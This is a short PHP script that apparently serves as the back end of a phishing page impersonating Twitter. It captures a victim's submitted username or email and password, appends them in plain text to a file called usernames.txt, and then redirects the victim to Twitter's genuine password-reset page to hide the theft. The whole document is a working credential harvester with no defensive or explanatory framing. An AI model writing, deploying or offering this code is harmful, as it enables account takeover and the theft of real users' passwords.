<?php

file_put_contents("usernames.txt", "Twitter Username: " . $_POST['usernameOrEmail'] . "\nPassword: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://twitter.com/account/begin_password_reset');
exit();
?>